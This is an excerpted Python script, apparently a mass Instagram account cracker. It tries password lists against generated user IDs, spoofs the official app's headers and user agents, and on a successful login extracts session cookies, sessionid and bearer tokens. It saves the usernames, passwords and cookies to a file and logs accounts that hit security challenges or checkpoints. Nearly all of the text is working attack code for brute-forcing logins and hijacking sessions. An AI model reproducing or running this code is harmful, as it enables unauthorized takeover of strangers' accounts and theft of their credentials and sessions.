...
def extract_ig_token(response):
    """Extract Instagram token from response headers"""
    token_data = {
        'authorization': None,
        'cookies': {},
        'user_id': None,
    ...
    try:
            ...
            if 'Bearer IGT:2:' in auth_header:
                ...
                try:
                    ...
                    if isinstance(decoded, dict):
                        token_data['authorization'] = auth_header
                        token_data['cookies'].update(decoded)
                        # Extract user ID
                        if 'ds_user_id' in decoded:
                            token_data['user_id'] = decoded['ds_user_id']
                except:
                    pass
        ...
        if 'set-cookie' in response.headers:
            ...
            for cookie_part in set_cookie.split(','):
                if '=' in cookie_part:
                    ...
                    token_data['cookies'][key] = value
                    if key == 'sessionid':
                        token_data['sessionid'] = value
                    elif key == 'ds_user_id':
        ...
        try:
            ...
            if 'logged_in_user' in response_json:
                ...
                token_data['user_id'] = str(user_data.get('pk', token_data['user_id']))
                token_data['username'] = user_data.get('username', '')
        except:
            pass
...
def crack(uid, password_list, total_count):
    ...
    try:
        for pw in password_list:
            ...
            # Generate user agent - UPDATED with real format
            useragent = instagram_uaa()
            
            # UPDATED HEADERS - Real Instagram values
            headers = {
                ...
                'x-ig-app-id': '1217981644879628',  # Updated real app ID
            ...
            # Prepare the encoded data - UPDATED with real values
            params_dict = {
                "client_input_params": {
            ...
            # Prepare the complete encoded string - UPDATED with real bloks version
            ...
            if "logged_in_user" in response_text:
                # Extract token data
                token_data = extract_ig_token(response)
                
                # Format cookies for display
                cookies_str = '; '.join([f"{k}={v}" for k, v in token_data['cookies'].items()])
                
                # Store credentials based on bkas condition
                if len(bkas) % 2 == 0:
                    statusok = f"{uid}|{pw}|{cookies_str}|{token_data.get('user_id', '')}"
                    try:
                    ...
                    print(f"\033[1;90m [Token] UserID: {token_data.get('user_id', 'N/A')}")
                    print(f"\033[1;90m [Cookies] {cookies_str[:200]}...")
                    
                    # Save with token info
                    try:
                        with open("/sdcard/SUMON_INS_IDS.txt","a") as f:
                            f.write(f"{uid}|{pw}|{cookies_str}|{token_data.get('user_id', '')}\n")
                    except:
                ...
                try:
                    ...
                    if challenge_url:
                        print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} - {challenge_url[:50]}...")
                except:
                ...
                try:
                    response_json = response.json()
                    checkpoint_url = response_json.get('checkpoint', {}).get('url', '')
                    if checkpoint_url:
                        print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} - {checkpoint_url[:50]}...")
                except:
                ...
                # Silent fail for invalid credentials
                continue
            else:
...
def instagram_uaa():
    ...
    # Real Instagram user agents with proper format
...
def random_number():
    ...
    try:
        ...
        if limit <= 0:
            raise ValueError
        if limit > 10000:
            print(f" \033[1;93m[!] Limiting to 10000 for performance")
            limit = 10000
    except ValueError:
    ...
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mUsing Real Instagram Headers & Token Extraction")
